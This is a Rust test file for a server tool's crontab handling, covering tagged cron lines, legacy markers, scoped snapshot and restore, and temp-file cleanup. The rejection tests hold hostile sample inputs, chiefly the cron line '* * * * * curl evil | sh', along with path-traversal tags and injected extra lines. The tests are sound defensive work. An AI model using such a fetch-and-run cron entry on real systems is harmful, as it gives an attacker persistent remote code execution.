use super::testing::{fake_crontab, text};
use super::*;
use crate::host::init::InitSystem;
use crate::sys::exec::{FakeExec, Output};
use crate::sys::fs::TempDir;
use std::cell::RefCell;
use std::sync::Arc;

fn default_paths() -> Paths {
    Paths::from_lookup(|_| None).unwrap()
}

fn tab(text: &str) -> Crontab {
    Crontab::parse(&default_paths(), text)
}

fn tag(s: &str) -> Tag {
    Tag::new(s).unwrap()
}

fn tags(tab: &Crontab) -> Vec<String> {
    tab.owned().map(|(t, _)| t.to_string()).collect()
}

const V1_BOOT: &str =
    "@reboot /usr/local/bin/onebox net-apply >/dev/null 2>&1; /usr/local/bin/onebox start >/dev/null 2>&1";

#[test]
fn classifies_v3_tags_and_every_older_marker() {
    let o = Ownership::of(&default_paths());
    let cases: &[(&str, Option<&str>)] = &[
        ("17 4 * * * x renew --cron >>'/l' 2>&1 # onebox:renew", Some("renew")),
        ("@reboot x # onebox:boot:onebox-xray  \t\r", Some("boot:onebox-xray")),
        ("17 3 * * * x # onebox:frp-renew", Some("frp-renew")),
        ("x # onebox:bad tag", None),
        ("x # onebox:", None),
        ("x #onebox:renew", None),
        ("17 4 * * * /usr/local/bin/onebox cert renew proxy --cron >/dev/null 2>&1 # onebox-native-cert-proxy", Some("renew")),
        ("17 4 * * * onebox cert renew site # onebox-native-cert-site\r", Some("renew")),
        ("17 4 * * * x # onebox-native-cert-subscription ", Some("renew")),
        ("@reboot onebox service onebox-xray start # onebox-rust:onebox-xray", Some("boot:onebox-xray")),
        ("@reboot onebox frps start # onebox-rust:onebox-frps", Some("boot:onebox-frps")),
        ("@reboot x # onebox-rust:../../evil", None),
        ("17 3 * * * x frps renew --cron >>'/l' 2>&1 # onebox-frps-renew", Some("frp-renew")),
        ("@reboot x frps start >>'/b' 2>&1 # onebox-frps-boot", Some("frp-boot")),
        (V1_BOOT, Some("legacy-boot")),
        (&format!("  {V1_BOOT}\r"), Some("legacy-boot")),
        ("@reboot '/usr/local/bin/onebox' net-apply >/dev/null 2>&1; /usr/local/bin/onebox start >/dev/null 2>&1", Some("legacy-boot")),
        (&format!("{V1_BOOT}; admin-command"), None),
        (&format!("{V1_BOOT} # note"), None),
        ("@reboot /opt/other/onebox net-apply >/dev/null 2>&1; /opt/other/onebox start >/dev/null 2>&1", None),
        ("0 0 * * * \"/etc/onebox/tls/acme\"/acme.sh --cron --home \"/etc/onebox/tls/acme\" > /dev/null", None),
        ("0 0 * * * /etc/onebox/tls/acme/acme.sh --cron --home /etc/onebox/tls/acme > /dev/null", Some("renew")),
        ("0 0 * * * /etc/onebox/site/acme/acme.sh --cron", Some("renew")),
        ("0 0 * * * /etc/onebox/site/acme/acme.sh --cronjob", None),
        ("0 3 * * * /usr/local/bin/onebox cert-renew site --cron", Some("renew")),
        ("0 3 * * * /usr/local/bin/onebox cert-renew other --cron", None),
        ("* * * * * admin-command # other", None),
        ("MAILTO=root", None),
        ("", None),
    ];
    for (line, want) in cases {
        let got = o.classify(line);
        assert_eq!(got.as_ref().map(Tag::as_str), *want, "{line:?}");
    }
    // The v1 line follows the configured executable, quoted when needed.
    let mut paths = default_paths();
    paths.executable = "/opt/my onebox/bin".into();
    let o = Ownership::of(&paths);
    let quoted = "@reboot '/opt/my onebox/bin' net-apply >/dev/null 2>&1; '/opt/my onebox/bin' start >/dev/null 2>&1";
    assert_eq!(o.classify(quoted), Some(Tag::legacy_boot()));
    let bare = "@reboot /opt/my onebox/bin net-apply >/dev/null 2>&1; /opt/my onebox/bin start >/dev/null 2>&1";
    assert_eq!(o.classify(bare), None);
}

#[test]
fn tags_are_validated() {
    assert!(Tag::new("boot:onebox-xray").is_ok());
    for bad in ["", "a b", "x\n", "a;b", &"x".repeat(97)] {
        assert!(Tag::new(bad).is_err(), "{bad:?}");
    }
    assert_eq!(
        Tag::boot("onebox-site").unwrap().as_str(),
        "boot:onebox-site"
    );
    assert!(Tag::boot("sshd").is_err());
}

#[test]
fn scopes_split_node_and_frp_lines() {
    for (t, node) in [
        ("renew", true),
        ("legacy-boot", true),
        ("boot:onebox-xray", true),
        ("boot:onebox-subscription-web", true),
        ("frp-renew", false),
        ("frp-boot", false),
        ("boot:onebox-frps", false),
        ("boot:onebox-frp-web", false),
    ] {
        assert_eq!(Scope::Node.covers(&tag(t)), node, "{t}");
        assert_eq!(Scope::Frp.covers(&tag(t)), !node, "{t}");
    }
}

#[test]
fn text_round_trips_and_always_ends_with_a_newline() {
    let original = "MAILTO=root\r\n# comment\n\n0 1 * * * job";
    let t = tab(original);
    assert_eq!(t.text(), "MAILTO=root\r\n# comment\n\n0 1 * * * job\n");
    assert!(t.is_modified(), "the missing final newline is added");
    let t = tab("a\nb\n");
    assert_eq!(t.text(), "a\nb\n");
    assert!(!t.is_modified());
    assert_eq!(tab("").text(), "");
}

#[test]
fn replace_swaps_a_group_in_place_and_keeps_foreign_order() {
    let original = "MAILTO=root\n\
        17 4 * * * a # onebox-native-cert-proxy\n\
        0 1 * * * backup\n\
        17 4 * * * b # onebox-native-cert-site\n\
        @reboot c # onebox-rust:onebox-xray\n\
        17 4 * * * d # onebox-native-cert-subscription\n\
        30 2 * * * report\n";
    let mut t = tab(original);
    assert_eq!(t.lines_for("renew").len(), 3);
    assert_eq!(
        t.lines_for("boot:"),
        ["@reboot c # onebox-rust:onebox-xray"]
    );
    assert_eq!(t.lines_for("").len(), 4);
    let renew = "17 4 * * * new # onebox:renew".to_owned();
    assert!(t
        .replace(&Tag::renew(), std::slice::from_ref(&renew))
        .unwrap());
    assert_eq!(
        t.text(),
        "MAILTO=root\n17 4 * * * new # onebox:renew\n0 1 * * * backup\n\
         @reboot c # onebox-rust:onebox-xray\n30 2 * * * report\n"
    );
    // Same content again: unchanged.
    assert!(!t.replace(&Tag::renew(), &[renew]).unwrap());

    // A new group is appended.
    let boot = "@reboot s # onebox:boot:onebox-sing-box".to_owned();
    t.replace(
        &Tag::boot("onebox-sing-box").unwrap(),
        std::slice::from_ref(&boot),
    )
    .unwrap();
    assert!(t.text().ends_with(&format!("30 2 * * * report\n{boot}\n")));
    assert_eq!(
        tags(&t),
        ["renew", "boot:onebox-xray", "boot:onebox-sing-box"]
    );

    // An empty replacement removes the group.
    assert!(t.replace(&Tag::renew(), &[]).unwrap());
    assert!(!t.has(&Tag::renew()));
}

#[test]
fn replace_refuses_lines_of_another_owner() {
    let mut t = tab("a\n");
    for bad in [
        "17 4 * * * x # onebox:frp-renew",
        "17 4 * * * foreign",
        "17 4 * * * x # onebox:renew\n* * * * * evil # onebox:renew",
    ] {
        assert!(
            t.replace(&Tag::renew(), &[bad.to_owned()]).is_err(),
            "{bad:?}"
        );
    }
    assert_eq!(t.text(), "a\n", "nothing changed");
}

#[test]
fn remove_and_remove_scope() {
    let mut t = tab(&format!(
        "a\n{V1_BOOT}\n@reboot x # onebox:boot:onebox-frps\nb # onebox:renew\nc\n"
    ));
    assert!(t.remove(&Tag::legacy_boot()));
    assert!(!t.remove(&Tag::legacy_boot()));
    assert!(t.remove_scope(Scope::Node));
    assert_eq!(t.text(), "a\n@reboot x # onebox:boot:onebox-frps\nc\n");
    assert!(t.remove_scope(Scope::Frp));
    assert_eq!(t.text(), "a\nc\n");
}

#[test]
fn snapshot_and_restore_cover_only_their_scope() {
    let original = format!(
        "a\n17 4 * * * p # onebox-native-cert-proxy\nb\n@reboot x # onebox:boot:onebox-xray\n\
         17 3 * * * f # onebox:frp-renew\nc\n{V1_BOOT}\n"
    );
    let t0 = tab(&original);
    let node = t0.snapshot(Scope::Node);
    assert_eq!(node.len(), 3);
    assert_eq!(t0.snapshot(Scope::Frp), ["17 3 * * * f # onebox:frp-renew"]);

    let mut t = t0.clone();
    t.replace(&Tag::renew(), &["17 4 * * * new # onebox:renew".into()])
        .unwrap();
    t.remove(&Tag::boot("onebox-xray").unwrap());
    t.remove(&Tag::legacy_boot());
    t.replace(
        &Tag::boot("onebox-sing-box").unwrap(),
        &["@reboot s # onebox:boot:onebox-sing-box".into()],
    )
    .unwrap();
    t.replace(
        &Tag::frp_renew(),
        &["17 3 * * * g # onebox:frp-renew".into()],
    )
    .unwrap();
    t.restore(&node, Scope::Node).unwrap();

    let restored = t.text();
    let foreign: Vec<&str> = restored.lines().filter(|l| !l.contains("onebox")).collect();
    assert_eq!(foreign, ["a", "b", "c"], "foreign order kept");
    let mut owned = t.snapshot(Scope::Node);
    let mut want = node.clone();
    owned.sort();
    want.sort();
    assert_eq!(owned, want, "node lines restored exactly");
    assert_eq!(
        t.snapshot(Scope::Frp),
        ["17 3 * * * g # onebox:frp-renew"],
        "FRP untouched"
    );
    assert!(t
        .text()
        .starts_with("a\n17 4 * * * p # onebox-native-cert-proxy\nb\n"));
}

#[test]
fn restore_refuses_foreign_or_out_of_scope_lines() {
    let mut t = tab("a\n17 4 * * * x # onebox:renew\n");
    for bad in [
        "* * * * * curl evil | sh",
        "17 3 * * * f # onebox:frp-renew",
        "17 4 * * * x # onebox:renew\n* * * * * y",
    ] {
        assert!(
            t.restore(&[bad.to_owned()], Scope::Node).is_err(),
            "{bad:?}"
        );
    }
    assert_eq!(t.text(), "a\n17 4 * * * x # onebox:renew\n");
    t.restore(&[], Scope::Node).unwrap();
    assert_eq!(t.text(), "a\n");
}

#[test]
fn listing_tells_no_crontab_from_failures() {
    let ok = |code: i32, stdout: &str, stderr: &str| Output {
        code,
        stdout: stdout.into(),
        stderr: stderr.into(),
    };
    for (out, want) in [
        (ok(0, "a\n", ""), Some("a\n")),
        (ok(1, "", "no crontab for root\n"), Some("")),
        (ok(1, "", "crontab: no crontab for root"), Some("")),
        (
            ok(
                1,
                "",
                "crontab: can't open 'root': No such file or directory\n",
            ),
            Some(""),
        ),
        (ok(1, "", ""), Some("")),
        (
            ok(1, "", "crontab: your UID isn't in the passwd file"),
            None,
        ),
        (ok(1, "a\n", "no crontab for root"), None),
        (ok(2, "", "no crontab for root"), None),
        (ok(124, "", ""), None),
    ] {
        match want {
            Some(text) => assert_eq!(listing(&out).unwrap(), text, "{out:?}"),
            None => assert!(
                listing(&out)
                    .unwrap_err()
                    .to_string()
                    .starts_with("无法读取当前 crontab"),
                "{out:?}"
            ),
        }
    }
}

struct Fixture {
    _dir: TempDir,
    ctx: Ctx,
    exec: Arc<FakeExec>,
}

fn fixture() -> Fixture {
    let dir = TempDir::new("cron").unwrap();
    let (ctx, exec, _) = Ctx::test(dir.path());
    Fixture {
        _dir: dir,
        ctx,
        exec,
    }
}

#[test]
fn install_uses_a_private_temp_file_and_cleans_it_up() {
    let f = fixture();
    let state = fake_crontab(&f.exec, None);
    let mut t = Crontab::read(&f.ctx).unwrap();
    assert_eq!(t.text(), "");
    assert!(!t.save(&f.ctx).unwrap(), "unchanged: nothing installed");
    t.replace(&Tag::renew(), &["0 4 * * * x # onebox:renew".into()])
        .unwrap();
    assert!(t.save(&f.ctx).unwrap());
    assert_eq!(text(&state), "0 4 * * * x # onebox:renew\n");
    let history = f.exec.history();
    assert_eq!(history[0], "crontab -l");
    let file = history[1].strip_prefix("crontab ").unwrap();
    assert!(file.starts_with(
        &f.ctx
            .paths
            .run
            .join(TEMP_PREFIX)
            .to_string_lossy()
            .into_owned()
    ));
    assert!(!Path::new(file).exists(), "temp file removed");
    assert!(f.exec.calls().iter().all(|c| c.timeout.is_some()));

    let f = fixture();
    f.exec.on("crontab", &["-l"], Output::success("a\n")).on(
        "crontab",
        &[],
        Output::failure(1, "errors in crontab file"),
    );
    let mut t = Crontab::read(&f.ctx).unwrap();
    t.remove_scope(Scope::Node);
    t.replace(&Tag::renew(), &["0 4 * * * x # onebox:renew".into()])
        .unwrap();
    let err = t.install(&f.ctx).unwrap_err();
    assert!(err.to_string().contains("errors in crontab file"));
    let leftovers = std::fs::read_dir(&f.ctx.paths.run).unwrap().count();
    assert_eq!(leftovers, 0);
}

#[test]
fn unreadable_crontabs_are_never_overwritten() {
    let f = fixture();
    f.exec.provide("crontab").on(
        "crontab",
        &["-l"],
        Output::failure(1, "crontab: your UID isn't in the passwd file"),
    );
    assert!(Crontab::read(&f.ctx).is_err());
    assert!(snapshot(&f.ctx, Scope::Node).is_err());
    let snap = CronSnapshot {
        available: true,
        lines: vec![],
    };
    assert!(restore(&f.ctx, &snap, Scope::Node).is_err());
    assert!(
        f.exec.history().iter().all(|c| c == "crontab -l"),
        "never installed"
    );
}

#[test]
fn transaction_snapshots_with_and_without_crontab() {
    let f = fixture();
    assert_eq!(
        snapshot(&f.ctx, Scope::Node).unwrap(),
        CronSnapshot::default()
    );
    let lines = vec!["17 4 * * * x # onebox:renew".to_owned()];
    let missing = CronSnapshot {
        available: true,
        lines: lines.clone(),
    };
    assert_eq!(
        restore(&f.ctx, &missing, Scope::Node)
            .unwrap_err()
            .to_string(),
        "恢复续期任务需要 crontab"
    );
    restore(&f.ctx, &CronSnapshot::default(), Scope::Node).unwrap();

    let f = fixture();
    let state = fake_crontab(&f.exec, Some("a\n17 4 * * * x # onebox:renew\nb\n"));
    let snap = snapshot(&f.ctx, Scope::Node).unwrap();
    assert_eq!(
        snap,
        CronSnapshot {
            available: true,
            lines
        }
    );
    *state.lock().unwrap() = Some("a\nb\n@reboot y # onebox:boot:onebox-xray\n".into());
    restore(&f.ctx, &snap, Scope::Node).unwrap();
    assert_eq!(text(&state), "a\nb\n17 4 * * * x # onebox:renew\n");
    let json = serde_json::to_string(&snap).unwrap();
    assert_eq!(serde_json::from_str::<CronSnapshot>(&json).unwrap(), snap);
}

#[test]
fn generated_lines_are_owned_by_their_tag() {
    let paths = default_paths();
    for (t, args) in [
        (Tag::renew(), vec!["renew", "--cron"]),
        (
            Tag::boot("onebox-xray").unwrap(),
            vec!["service", "onebox-xray", "start"],
        ),
        (Tag::frp_renew(), vec!["frps", "renew", "--cron"]),
    ] {
        let l = line(
            "@daily",
            &paths,
            InitSystem::None,
            &args,
            Path::new("/var/log/x.log"),
            &t,
        )
        .unwrap();
        let mut c = tab("x\n");
        c.replace(&t, &[l]).unwrap();
        assert!(c.has(&t));
    }
}

#[test]
fn cron_daemon_checks_per_init_system() {
    // systemd: an active unit is enough.
    let f = fixture();
    f.exec
        .on(
            "systemctl",
            &["is-active", "--quiet", "crond"],
            Output::success(""),
        )
        .on("systemctl", &[], Output::failure(3, ""));
    scheduler_running(&f.ctx, InitSystem::Systemd).unwrap();
    assert_eq!(
        f.exec.history(),
        [
            "systemctl is-active --quiet cron",
            "systemctl is-active --quiet crond"
        ]
    );
    // systemd: none active, the second can be enabled.
    let f = fixture();
    f.exec
        .on(
            "systemctl",
            &["enable", "--now", "crond"],
            Output::success(""),
        )
        .on("systemctl", &[], Output::failure(1, ""));
    scheduler_running(&f.ctx, InitSystem::Systemd).unwrap();
    assert_eq!(
        f.exec.history().last().unwrap(),
        "systemctl enable --now crond"
    );
    let f = fixture();
    f.exec.on("systemctl", &[], Output::failure(1, ""));
    assert_eq!(
        scheduler_running(&f.ctx, InitSystem::Systemd)
            .unwrap_err()
            .to_string(),
        NOT_RUNNING
    );

    // OpenRC: the first script that starts joins the default runlevel.
    let f = fixture();
    f.exec
        .on("rc-service", &["cronie", "start"], Output::success(""))
        .on("rc-service", &[], Output::failure(1, "does not exist"))
        .on(
            "rc-update",
            &["add", "cronie", "default"],
            Output::success(""),
        );
    scheduler_running(&f.ctx, InitSystem::Openrc).unwrap();
    assert_eq!(
        f.exec.history(),
        [
            "rc-service crond start",
            "rc-service cronie start",
            "rc-update add cronie default"
        ]
    );
    let f = fixture();
    f.exec
        .on("rc-service", &["crond", "start"], Output::success(""))
        .on("rc-update", &[], Output::failure(1, "denied"));
    assert!(scheduler_running(&f.ctx, InitSystem::Openrc).is_err());

    // No init: a cron process must exist.
    let f = fixture();
    assert!(scheduler_running(&f.ctx, InitSystem::None).is_err());
    let proc_dir = f.ctx.paths.system("/proc/321");
    std::fs::create_dir_all(&proc_dir).unwrap();
    std::fs::write(proc_dir.join("comm"), "crond\n").unwrap();
    scheduler_running(&f.ctx, InitSystem::None).unwrap();
}

#[test]
fn ensure_available_installs_crontab_first() {
    let f = fixture();
    let proc_dir = f.ctx.paths.system("/proc/9");
    std::fs::create_dir_all(&proc_dir).unwrap();
    std::fs::write(proc_dir.join("comm"), "cron\n").unwrap();
    let asked = RefCell::new(Vec::new());
    let install = |_: &Ctx, command: &str, package: &str| -> Result<()> {
        asked.borrow_mut().push(format!("{command}/{package}"));
        Ok(())
    };
    ensure_available(&f.ctx, InitSystem::None, &install).unwrap();
    assert_eq!(*asked.borrow(), ["crontab/cron"]);

    f.exec.provide("crontab");
    asked.borrow_mut().clear();
    ensure_available(&f.ctx, InitSystem::None, &install).unwrap();
    assert!(asked.borrow().is_empty(), "already installed");

    let failing = |_: &Ctx, _: &str, _: &str| -> Result<()> { Err(Error::msg("无包管理器")) };
    let f = fixture();
    assert_eq!(
        ensure_available(&f.ctx, InitSystem::None, &failing)
            .unwrap_err()
            .to_string(),
        "无包管理器"
    );
}
